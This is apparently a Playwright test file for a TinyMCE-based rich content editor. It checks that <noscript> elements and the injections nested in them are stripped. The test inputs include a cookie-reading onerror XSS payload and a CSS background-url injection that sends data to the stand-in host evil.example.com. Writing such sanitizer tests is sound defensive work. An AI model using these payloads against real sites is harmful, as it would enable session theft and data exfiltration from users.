import {test, expect} from '../../fixtures/test'

// <noscript> is a classic XSS vector — its content is rendered as HTML when
// JavaScript is disabled, and some parsers treat it as executable. Combined
// with CSS injection it can exfiltrate data. TinyMCE should strip it.
// This tests canvas-rce's handling of this less-common injection vector.
test.describe('<noscript> element sanitization', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('<noscript> tag is stripped from content', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p>Before</p><noscript><p>Hidden noscript content</p></noscript><p>After</p>',
    )
    expect(content).not.toContain('<noscript')
    expect(content).toContain('Before')
    expect(content).toContain('After')
  })

  test('<noscript> with embedded script is sanitized', async ({page}) => {
    const content = await setAndGet(
      page,
      '<noscript><img src="x" onerror="alert(document.cookie)" /></noscript><p>safe</p>',
    )
    expect(content).not.toContain('onerror')
    expect(content).not.toContain('document.cookie')
    expect(content).toContain('safe')
  })

  test('<noscript> with style injection is sanitized', async ({page}) => {
    const content = await setAndGet(
      page,
      '<noscript><style>body { background: url(https://evil.example.com/?data=exfil) }</style></noscript><p>content</p>',
    )
    expect(content).not.toContain('evil.example.com')
    expect(content).toContain('content')
  })

  test('content surrounding <noscript> is fully preserved', async ({page}) => {
    const content = await setAndGet(
      page,
      '<h2>Title</h2><noscript>stripped</noscript><p>Body text remains intact.</p>',
    )
    expect(content).toContain('Title')
    expect(content).toContain('Body text remains intact')
  })
})
